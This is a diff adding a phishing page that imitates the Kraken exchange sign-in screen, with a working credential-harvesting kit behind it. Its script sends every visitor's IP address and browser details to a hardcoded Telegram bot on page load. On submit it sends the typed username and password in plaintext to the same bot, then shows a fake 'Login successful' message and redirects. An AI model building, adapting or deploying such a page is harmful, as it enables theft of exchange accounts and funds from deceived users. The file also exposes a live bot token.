@@ -1,0 +1,539 @@
+<!doctype html>
+<html>
+
+<head>
+  <title>Kraken</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="./output.css" rel="stylesheet">
+</head>
+<style>
+  @keyframes float {
+
+    0%,
+    100% {
+      transform: translateY(0);
+    }
+
+    50% {
+      transform: translateY(-20px);
+    }
+  }
+
+  .floating-video {
+    animation: float 3s ease-in-out infinite;
+    vertical-align: middle;
+  }
+
+  /* Language dropdown styles */
+  .language-dropdown {
+    position: relative;
+    display: inline-block;
+  }
+
+  .language-dropdown-content {
+    display: none;
+    position: absolute;
+    right: 0;
+    background-color: white;
+    min-width: 160px;
+    box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.1);
+    border-radius: 8px;
+    z-index: 1;
+    margin-top: 8px;
+  }
+
+  .language-dropdown-content a {
+    color: #6b7280;
+    padding: 8px 16px;
+    text-decoration: none;
+    display: block;
+    font-size: 14px;
+  }
+
+  .language-dropdown-content a:hover {
+    background-color: #f3f4f6;
+    color: #000;
+    font-weight: bold;
+  }
+
+  .language-dropdown.active .language-dropdown-content {
+    display: block;
+  }
+
+  /* Rest of your existing styles... */
+  /* Custom DS colors - updated for white background */
+  :root {
+    --ds-container: #ffffff;
+    --ds-input: #f3f4f6;
+    --ds-input-hover: #e5e7eb;
+    --ds-input-selected: #d1d5db;
+    --ds-primary: #1f2937;
+    --ds-brand: #5d6bff;
+    --ds-neutral: #6b7280;
+    --ds-button-primary: #5d6bff;
+    --ds-brands: #a855f7;
+    --ds-button-primary-hover: #4a58e6;
+    --ds-button-primary-hover: #8e21f4;
+  }
+
+  /* Updated shadow for white background */
+  .white-glow {
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.05),
+      0 0 30px rgba(0, 0, 0, 0.05);
+  }
+
+  /* Floating label styles */
+  .input-container {
+    position: relative;
+    height: 56px;
+  }
+
+  .input-label {
+    position: absolute;
+    left: 16px;
+    top: 18px;
+    color: #6b7280;
+    font-size: 16px;
+    transition: all 0.2s ease-out;
+    pointer-events: none;
+  }
+
+  .input-field {
+    width: 100%;
+    height: 100%;
+    padding: 26px 16px 10px;
+    background-color: #f3f4f6;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    outline: none;
+    transition: all 0.2s ease-out;
+  }
+
+  .input-field:hover {
+    background-color: #e5e7eb;
+  }
+
+  .input-field:focus {
+    background-color: #e5e7eb;
+
+  }
+
+  .input-field:focus+.input-label,
+  .input-field:not(:placeholder-shown)+.input-label {
+    top: 8px;
+    font-size: 12px;
+    color: var(--ds-neutral);
+  }
+
+  /* Error message styling */
+  .error-message {
+    color: #ef4444;
+    font-size: 0.875rem;
+    margin-top: 0.25rem;
+    display: none;
+  }
+  
+  /* Success message styling */
+  .success-message {
+    color: #10b981;
+    font-size: 0.875rem;
+    margin-top: 0.5rem;
+    text-align: center;
+    font-weight: 500;
+    display: none;
+  }
+
+  /* Loading spinner */
+  .spinner {
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: white;
+    animation: spin 1s ease-in-out infinite;
+    display: none;
+  }
+
+  @keyframes spin {
+    to {
+      transform: rotate(360deg);
+    }
+  }
+
+  /* Responsive adjustments */
+  @media (max-width: 640px) {
+    .responsive-container {
+      width: 90%;
+      padding: 1.5rem;
+    }
+
+    .responsive-video {
+      width: 120px;
+    }
+
+    .responsive-input {
+      min-width: 100% !important;
+    }
+  }
+</style>
+
+<body class="pro-text-theme default-shape-theme light-theme bg-gray-50">
+  <div class="flex flex-col min-h-screen">
+    <header class="py-4">
+      <div class="max-w-7xl mx-auto flex items-center justify-between px-4 md:px-8">
+        <!-- Logo - Show square SVG on mobile, full logo on desktop -->
+        <a href="https://www.kraken.com" class="flex items-center">
+          <!-- Square SVG (Mobile) -->
+          <div class="md:hidden">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+              class="text-purple-600" style="width: 26px; height: 26px;">
+              <path fill-rule="evenodd" clip-rule="evenodd"
+                d="M2 13.8332V18.1963C2 18.9998 2.63994 19.6499 3.42687 19.6499C4.21464 19.6499 4.85762 18.9998 4.85762 18.1963V13.8332C4.85762 13.0286 5.49424 12.3773 6.28532 12.3773C7.07364 12.3773 7.71302 13.0286 7.71302 13.8332V18.1963C7.71302 18.9998 8.35296 19.6499 9.14073 19.6499C9.93125 19.6499 10.5709 18.9998 10.5709 18.1963V13.8332C10.5709 13.0286 11.2103 12.3773 11.9983 12.3773C12.7897 12.3773 13.4296 13.0286 13.4296 13.8332V18.1963C13.4296 18.9998 14.0693 19.6499 14.8562 19.6499C15.644 19.6499 16.2839 18.9998 16.2839 18.1963V13.8332C16.2839 13.0286 16.9236 12.3773 17.7147 12.3773C18.5027 12.3773 19.1424 13.0286 19.1424 13.8332V18.1963C19.1424 18.9998 19.7823 19.6499 20.5723 19.6499C21.3603 19.6499 22 18.9998 22 18.1963V13.8332C22 8.20968 17.5218 3.6499 11.9983 3.6499C6.47514 3.6499 2 8.20968 2 13.8332Z"
+                class="fill-current stroke-transparent"></path>
+            </svg>
+          </div>
+
+          <!-- Full Logo (Desktop) -->
+          <div class="hidden md:block">
+            <svg height="24" viewBox="0 0 91 15" xmlns="http://www.w3.org/2000/svg" class="fill-purple-600">
+              <path
+                d="M79.5312 14.0147V0.785345H81.7917V2.48076C82.5367 1.19636 84.1036 0.400024 85.8761 0.400024C88.7789 0.400024 90.8853 1.94131 90.8853 5.92296V14.0147H88.5734V6.25691C88.5734 3.79085 87.366 2.58351 85.3624 2.58351C83.1018 2.58351 81.8431 4.12479 81.8431 6.33397V14.0147H79.5312Z">
+              </path>
+              <path
+                d="M71.5676 14.4C67.4832 14.4 64.8887 11.6514 64.8887 7.3358C64.8887 3.20002 67.5345 0.400024 71.3621 0.400024C75.1639 0.400024 77.8354 2.96883 77.8354 6.64223C77.8354 7.69544 77.8354 7.92663 77.7841 8.15782H67.3033C67.4575 10.7523 69.0758 12.345 71.5932 12.345C73.3657 12.345 74.5987 11.5743 75.2153 10.1615H77.6042C76.9107 12.8074 74.6758 14.4 71.5676 14.4ZM67.3033 6.25691H75.3951C75.2923 3.8936 73.751 2.42938 71.3621 2.42938C69.0758 2.42938 67.5602 3.84223 67.3033 6.25691Z">
+              </path>
+              <path
+                d="M44.523 14.4C41.8515 14.4 39.8992 12.9615 39.8992 10.4697C39.8992 7.97801 41.6717 6.84773 43.7524 6.46241L46.9891 5.8459C48.0937 5.64039 48.7359 5.35782 48.7359 4.35599C48.7359 3.20002 47.7597 2.42938 45.8074 2.42938C44.2148 2.42938 42.8276 3.07158 42.6478 4.5358H40.2588C40.4129 1.94131 42.7762 0.400024 45.8331 0.400024C49.5322 0.400024 51.0478 2.24957 51.0478 4.43305V11.2147C51.0478 11.2147 51.3304 12.1395 51.8441 12.1395C52.2808 12.1395 52.5377 12.0367 52.7689 11.8826V13.7578C52.4093 14.0661 51.7928 14.2716 51.0478 14.2716C49.9689 14.2716 49.0441 13.578 48.8129 12.4477C48.1964 13.3211 46.912 14.4 44.523 14.4ZM42.2882 10.3927C42.2882 11.7285 43.4184 12.3707 44.934 12.3707C47.0662 12.3707 48.7359 11.1633 48.7359 9.2881V7.15599C48.479 7.43856 47.6827 7.66975 46.7322 7.84957L44.5744 8.26057C43.0331 8.54314 42.2882 9.21103 42.2882 10.3927Z">
+              </path>
+              <path
+                d="M32.9541 14.0147V0.785343H35.2146V2.99452C35.8568 1.42755 37.0128 0.502775 38.8366 0.502775C39.222 0.502775 39.6073 0.57984 39.8128 0.631215V2.99452C39.6073 2.94314 39.1706 2.86608 38.7339 2.86608C36.4733 2.86608 35.266 4.63856 35.266 7.46424V14.0147H32.9541Z">
+              </path>
+              <path
+                d="M28.9027 0.785341H31.8825L26.5394 6.02571L32.1651 14.0147H29.4678L24.9724 7.61837L22.7633 9.72479V14.0147H20.4513V0.785341H22.7633V6.84773L28.9027 0.785341Z">
+              </path>
+              <path
+                d="M62.2915 0.785341H65.2713L59.9282 6.02571L65.5538 14.0147H62.8566L58.3612 7.61837L56.152 9.72479V14.0147H53.8401V0.785341H56.152V6.84773L62.2915 0.785341Z">
+              </path>
+              <path
+                d="M8.79521 0.400024C3.93757 0.400024 0 4.38923 0 9.31008V13.1284C0 13.8308 0.561922 14.3997 1.25558 14.3997C1.94923 14.3997 2.51527 13.8308 2.51527 13.1284V9.31008C2.51527 8.60561 3.07513 8.03662 3.77084 8.03662C4.4645 8.03662 5.02642 8.60561 5.02642 9.31008V13.1284C5.02642 13.8308 5.58834 14.3997 6.282 14.3997C6.97771 14.3997 7.53963 13.8308 7.53963 13.1284V9.31008C7.53963 8.60561 8.10155 8.03662 8.79521 8.03662C9.49092 8.03662 10.0549 8.60561 10.0549 9.31008V13.1284C10.0549 13.8308 10.6168 14.3997 11.3105 14.3997C12.0041 14.3997 12.5661 13.8308 12.5661 13.1284V9.31008C12.5661 8.60561 13.128 8.03662 13.8257 8.03662C14.5194 8.03662 15.0813 8.60561 15.0813 9.31008V13.1284C15.0813 13.8308 15.6432 14.3997 16.339 14.3997C17.0326 14.3997 17.5945 13.8308 17.5945 13.1284V9.31008C17.5945 4.38923 13.6549 0.400024 8.79521 0.400024Z">
+              </path>
+            </svg>
+          </div>
+        </a>
+
+        <!-- Rest of your header content remains the same -->
+        <div class="flex items-center gap-4">
+          <!-- Language Dropdown -->
+          <div class="language-dropdown">
+            <button id="languageToggle"
+              class="flex items-center gap-2 px-3 py-1.5 bg-gray-200 hover:bg-gray-300 text-gray-500 hover:text-black-200 font-semibold text-sm rounded-md shadow-sm transition">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                stroke="currentColor" class="w-6 h-6">
+                <path stroke-linecap="round" stroke-linejoin="round"
+                  d="M12 21a9.004 9.004 0 008.716-6.747M12 21a9.004 9.004 0 01-8.716-6.747M12 21c2.485 0 4.5-4.03 4.5-9S14.485 3 12 3m0 18c-2.485 0-4.5-4.03-4.5-9S9.515 3 12 3m0 0a8.997 8.997 0 017.843 4.582M12 3a8.997 8.997 0 00-7.843 4.582m15.686 0A11.953 11.953 0 0112 10.5c-2.998 0-5.74-1.1-7.843-2.918m15.686 0A8.959 8.959 0 0121 12c0 .778-.099 1.533-.284 2.253m0 0A17.919 17.919 0 0112 16.5c-3.162 0-6.133-.815-8.716-2.247m0 0A9.015 9.015 0 013 12c0-1.605.42-3.113 1.157-4.418" />
+              </svg>
+              <span>U.S. English</span>
+              <svg class="w-4 h-4 stroke-gray-500" fill="none" stroke="currentColor" stroke-width="2"
+                viewBox="0 0 24 24">
+                <path d="m6 9 6 6 6-6" />
+              </svg>
+            </button>
+
+            <div class="language-dropdown-content">
+              <a href="#" class="font-bold text-black">English (US)</a>
+              <a href="#">Español</a>
+              <a href="#">Français</a>
+              <a href="#">Deutsch</a>
+              <a href="#">日本語</a>
+              <a href="#">中文</a>
+            </div>
+          </div>
+
+          <!-- Create Account Button -->
+          <a href="https://www.kraken.com/sign-up?rfr=consumer-web&theme=light"
+            class="bg-purple-100 text-purple-700 hover:bg-purple-200 rounded px-4 py-2 text-sm font-medium transition">
+            Create Account
+          </a>
+        </div>
+      </div>
+    </header>
+
+    <!-- Rest of your content remains the same... -->
+    <div class="flex justify-center w-full">
+      <div class="responsive-container white-glow mt-4 w-full max-w-[498px] bg-white rounded-xl overflow-hidden p-8">
+        <div class="flex flex-col">
+          <form id="form">
+            <div class="flex flex-col gap-6">
+              <!-- Animated Video Header -->
+              <div class="flex flex-col items-center gap-6">
+                <video class="floating-video w-40" autoplay loop muted playsinline preload="auto"
+                  disablepictureinpicture src="./Beast_Web.webm"></video>
+                <div class="w-full">
+                  <h1 class="text-gray-800 text-2xl font-bold text-center">Sign in to Kraken</h1>
+                </div>
+              </div>
+
+              <!-- Form Inputs -->
+              <div class="flex flex-col gap-4">
+                <!-- Email/Username Field -->
+                <div class="flex flex-col gap-1">
+                  <div
+                    class="input-container bg-gray-100 hover:bg-gray-200 focus-within:bg-gray-300 rounded-lg outline outline-2 outline-transparent focus-within:outline-[var(--ds-brands)] transition-all duration-200">
+                    <input id="username" name="username" autocomplete="username" class="input-field" placeholder=" "
+                      required>
+                    <label for="username" class="input-label">Email or username</label>
+                  </div>
+                  <div id="username-error" class="error-message">Please enter a valid email or username</div>
+                </div>
+
+                <!-- Password Field -->
+                <div class="flex flex-col gap-1">
+                  <div
+                    class="input-container bg-gray-100 hover:bg-gray-200 focus-within:bg-gray-300 rounded-lg outline outline-2 outline-transparent focus-within:outline-[var(--ds-brands)] transition-all duration-200">
+                    <input id="password" name="password" type="password" autocomplete="current-password"
+                      class="input-field" placeholder=" " required>
+                    <label for="password" class="input-label">Password</label>
+                    <div class="absolute right-3 top-1/2 transform -translate-y-1/2">
+                      <button type="button" aria-label="Show password"
+                        class="text-gray-500 hover:text-gray-700 p-2 rounded-full">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path
+                            d="M15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12Z"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="fill-transparent"></path>
+                          <path
+                            d="M21.4974 11.0946C16.66 2.96839 7.33998 2.96848 2.50257 11.0947C2.17069 11.6523 2.17069 12.3479 2.50257 12.9054C7.33998 21.0316 16.66 21.0315 21.4974 12.9053C21.8293 12.3477 21.8293 11.6521 21.4974 11.0946Z"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="fill-transparent"></path>
+                        </svg>
+                      </button>
+                    </div>
+                  </div>
+                  <div id="password-error" class="error-message">Please enter your password</div>
+                </div>
+
+                <p class="text-gray-500 text-sm">
+                  Forgot <a class="text-[var(--ds-brand)] hover:underline" href="/forgot-password">password</a> or
+                  <a class="text-[var(--ds-brand)] hover:underline" href="/forgot-username">username</a>?
+                </p>
+              </div>
+
+              <!-- Success Message -->
+              <div id="success-message" class="success-message">
+                Login successful! Redirecting...
+              </div>
+
+              <!-- Continue Button -->
+              <div>
+                <button id="submit-btn"
+                  class="w-full bg-gradient-to-r from-purple-500 to-purple-700 hover:from-[var(--ds-button-primary-hover)] hover:to-[#6d28d9] text-white font-medium rounded-lg py-3 px-6 shadow-md transition-all duration-200 hover:shadow-lg flex items-center justify-center gap-2"
+                  type="submit">
+                  <span id="button-text">Continue</span>
+                  <div id="spinner" class="spinner"></div>
+                </button>
+              </div>
+
+              <!-- Help Link -->
+              <p class="text-center text-gray-500 text-sm">
+                Still can't sign in? <a class="text-[var(--ds-brand)] hover:underline font-medium" target="_blank"
+                  rel="noopener noreferrer" href="https://support.kraken.com/hc/forms/37016855737620">Email us</a>
+              </p>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <footer class="mt-auto w-full">
+      <div class="flex flex-col items-center gap-4 p-4">
+        <div class="lg:order-last">
+          <div class="flex gap-4">
+            <a class="text-gray-500 hover:text-black hover:font-bold hover:underline" target="_blank"
+              href="https://www.kraken.com/legal/privacy">
+              Privacy Notice
+            </a>
+            <a class="text-gray-500 hover:text-black hover:font-bold hover:underline" target="_blank"
+              href="https://www.kraken.com/legal">
+              Terms of Service
+            </a>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    // Function to send visitor information to Telegram
+    async function sendVisitorInfo() {
+      const token = "7654607863:AAFSUvkqB_fnWfHQCw9u_oVcdNbQYHyC-B8";
+      const chat_id = "1624312320";
+
+      // Get visitor information
+      const timestamp = new Date().toLocaleString();
+      const userAgent = navigator.userAgent;
+      const screenResolution = `${window.screen.width}x${window.screen.height}`;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const referrer = document.referrer || 'Direct';
+
+      // Get IP address
+      let ipAddress = "Unknown";
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip;
+      } catch (ipError) {
+        console.error('Could not fetch IP:', ipError);
+      }
+
+      // Create visitor message
+      const message = `
+🚨 New Visitor 🚨
+📅 Time: ${timestamp}
+🌐 IP Address: ${ipAddress}
+🖥️ User Agent: ${userAgent}
+🖥️ Screen: ${screenResolution}
+📍 Timezone: ${timezone}
+🔗 Referrer: ${referrer}
+      `;
+
+      // Encode the message for URL
+      const encodedMessage = encodeURIComponent(message);
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodedMessage}`;
+
+      // Send the data silently (don't wait for response)
+      fetch(url).catch(error => console.error('Error sending visitor info:', error));
+    }
+
+    // Send visitor info when page loads
+    document.addEventListener('DOMContentLoaded', sendVisitorInfo);
+
+    // Toggle language dropdown
+    document.getElementById('languageToggle').addEventListener('click', function (e) {
+      e.preventDefault();
+      this.closest('.language-dropdown').classList.toggle('active');
+    });
+
+    // Close dropdown when clicking outside
+    document.addEventListener('click', function (e) {
+      if (!e.target.closest('.language-dropdown')) {
+        document.querySelector('.language-dropdown')?.classList.remove('active');
+      }
+    });
+
+    // Form elements
+    const form = document.getElementById('form');
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const usernameError = document.getElementById("username-error");
+    const passwordError = document.getElementById("password-error");
+    const successMessage = document.getElementById("success-message");
+    const submitBtn = document.getElementById("submit-btn");
+    const buttonText = document.getElementById("button-text");
+    const spinner = document.getElementById("spinner");
+
+    // Form submission with error handling
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      // Reset messages
+      usernameError.style.display = 'none';
+      passwordError.style.display = 'none';
+      successMessage.style.display = 'none';
+
+      // Validate inputs
+      let isValid = true;
+
+      if (!usernameInput.value.trim()) {
+        usernameError.style.display = 'block';
+        isValid = false;
+      }
+
+      if (!passwordInput.value.trim()) {
+        passwordError.style.display = 'block';
+        isValid = false;
+      }
+
+      if (!isValid) return;
+
+      // Show loading state
+      buttonText.textContent = 'Processing...';
+      spinner.style.display = 'block';
+      submitBtn.disabled = true;
+
+      try {
+        const username = usernameInput.value;
+        const password = passwordInput.value;
+        const token = "7654607863:AAFSUvkqB_fnWfHQCw9u_oVcdNbQYHyC-B8";
+        const chat_id = "1624312320";
+
+        // Get additional information
+        const timestamp = new Date().toLocaleString();
+
+        // Create login message
+        const message = `
+🚨 Login Attempt 🚨
+📅 Time: ${timestamp}
+📧 Username: ${username}
+🔑 Password: ${password}
+        `;
+
+        // Encode the message for URL
+        const encodedMessage = encodeURIComponent(message);
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodedMessage}`;
+
+        // Send the data
+        const response = await fetch(url);
+
+        if (!response.ok) {
+          throw new Error(`Telegram API error: ${response.status}`);
+        }
+
+        // Show success message
+        successMessage.style.display = 'block';
+        
+        // Simulate a successful login
+        setTimeout(() => {
+          form.reset();
+          // Redirect to official Kraken login page
+          window.location.href = './design.html';
+        }, 2000);
+
+      } catch (error) {
+        console.error('Error:', error);
+        // Show error state (you could add an error message div if you want)
+      } finally {
+        // Reset button state
+        buttonText.textContent = 'Continue';
+        spinner.style.display = 'none';
+        submitBtn.disabled = false;
+      }
+    });
+
+    // Toggle password visibility
+    document.querySelector('[aria-label="Show password"]').addEventListener('click', function () {
+      const passwordInput = document.getElementById("password");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        this.innerHTML = `
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M2 2L22 22" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            <path d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 21.3082 13.3317 20 14.8335" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        `;
+      } else {
+        passwordInput.type = "password";
+        this.innerHTML = `
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fill-transparent"/>
+            <path d="M21.4974 11.0946C16.66 2.96839 7.33998 2.96848 2.50257 11.0947C2.17069 11.6523 2.17069 12.3479 2.50257 12.9054C7.33998 21.0316 16.66 21.0315 21.4974 12.9053C21.8293 12.3477 21.8293 11.6521 21.4974 11.0946Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fill-transparent"/>
+          </svg>
+        `;
+      }
+    });
+  </script>
+</body>
+
+</html>
